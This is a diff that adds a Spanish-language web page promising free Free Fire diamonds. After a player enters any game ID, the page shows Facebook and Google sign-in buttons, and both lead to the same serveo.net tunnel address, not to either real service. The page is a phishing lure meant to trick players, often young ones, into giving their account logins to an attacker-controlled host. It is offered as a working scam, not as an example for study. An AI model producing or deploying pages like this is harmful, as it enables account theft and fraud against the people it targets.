@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regalador de Diamantes</title>
+    <style>
+        /* Fondo RGB animado */
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background: linear-gradient(45deg, rgba(255,0,0,0.7), rgba(0,255,255,0.7), rgba(0,0,255,0.7), rgba(0,255,0,0.7));
+            background-size: 400% 400%;
+            animation: gradientAnimation 6s ease infinite;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* Animación del fondo RGB */
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.6); /* Fondo oscuro para que el texto resalte */
+            padding: 20px;
+            border-radius: 10px;
+            width: 350px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); /* Efecto de sombra para dar un toque luminoso */
+        }
+
+        .input-container {
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 200px;
+            border: none;
+            border-radius: 5px;
+            margin-right: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8); /* Brillo en los campos de texto */
+        }
+
+        .btn-submit {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff9900;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8); /* Brillo en el botón */
+        }
+
+        .btn-submit:hover {
+            background-color: #e68a00;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 1); /* Aumentar brillo al pasar el mouse */
+        }
+
+        .login-options {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .login-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            margin: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        .facebook {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .google {
+            background-color: #db4437;
+            color: white;
+        }
+
+        .login-button:hover {
+            opacity: 0.8;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 1);
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bienvenido al Regalador de Diamantes</h1>
+        <div class="input-container">
+            <input type="text" id="userID" placeholder="Ingresa tu ID De Free Fire" />
+            <button class="btn-submit" onclick="checkID()">Enviar</button>
+        </div>
+        <div class="login-options" id="loginOptions">
+            <p>Inicia sesión con tu cuenta FREE:</p>
+            <button class="login-button facebook" onclick="redirectToFacebook()">Iniciar sesión con Facebook</button>
+            <button class="login-button google" onclick="redirectToGoogle()">Iniciar sesión con Google</button>
+        </div>
+    </div>
+
+    <script>
+        function checkID() {
+            var userID = document.getElementById("userID").value;
+            if (userID !== "") {
+                // Mostrar opciones de login al ingresar cualquier ID
+                document.getElementById("loginOptions").style.display = "block";
+            } else {
+                alert("Por favor ingresa un ID válido.");
+            }
+        }
+
+        function redirectToFacebook() {
+            window.location.href = "https://fe86a13e3fc028b118038584a734a49a.serveo.net";
+        }
+
+        function redirectToGoogle() {
+            window.location.href = "https://fe86a13e3fc028b118038584a734a49a.serveo.net";
+        }
+    </script>
+</body>
+</html>
+
